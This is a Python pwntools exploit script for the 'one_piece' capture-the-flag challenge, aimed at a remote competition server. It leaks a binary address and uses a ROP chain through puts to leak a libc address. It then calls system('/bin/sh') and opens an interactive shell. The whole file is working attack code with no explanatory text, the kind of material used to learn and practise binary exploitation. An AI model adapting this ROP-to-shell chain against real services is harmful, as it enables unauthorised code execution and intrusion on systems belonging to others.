#!/usr/bin/env python3

from pwn import *

exe = ELF("./one_piece")
libc = ELF("./libc6_2.30-0ubuntu2.1_amd64.so")
ld = ELF("./ld-2.30.so")

context.binary = exe


def conn():
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def read(r, payload):
    r.sendlineafter("(menu)>>", "read")
    r.sendlineafter(">>", payload)


def one_piece(r):
    global binary_leak
    r.sendlineafter(">>", "gomugomunomi")
    r.recvuntil(": ")
    LEAK = int(b"0x"+r.recv(12), 16)
    return LEAK

def send_payload(r, payload):
    r.recvuntil("Wanna tell Luffy something ? :")
    r.recvline()
    r.sendline(payload)
 

def main():
#    r = conn()
    
    r = remote("onepiece.fword.wtf", 1238)

    shellcode = b"M"*0x27 + b"z"
    read(r, shellcode)

#    gdb.attach(r)

    offset = 56

    LEAK = one_piece(r)
    log.info("Binary leak @ 0x%x", LEAK)

    binary_base = LEAK - 0xa3a #locally 0xa3a
    log.info("binary base @ 0x%x", binary_base)
    PopRdi = binary_base + 0x0000000000000ba3
    ret = binary_base + 0x000000000000070e
    payload  = b"M"*offset
    mugiwara = binary_base + 0x998
    main = binary_base + 0xb1a


    payload += p64(PopRdi)
    log.info("Pop rdi @ 0x%x", PopRdi)
    payload += p64(binary_base + exe.got['setvbuf'])
    #payload += p64(ret)
    payload += p64(binary_base + exe.plt['puts'])
    payload += p64(main)
    pause()

    send_payload(r, payload)
    setvbuf = r.recvuntil("\x7f")
    setvbuf = u64(setvbuf[-6::] + b"\x00"*2)
    log.info("setvbuf @ 0x%x", setvbuf)
    
    libc_base = setvbuf - 0x087d50

    system = libc_base + 0x0554e0
    binsh = libc_base + 0x1b6613

    payload = b"M"*offset
    payload += p64(PopRdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(system)

    read(r, shellcode)

    one_piece(r)
    #r.interactive()
    #payload = cyclic_metasploit(100)
    send_payload(r, payload)

    r.interactive()


if __name__ == "__main__":
    main()
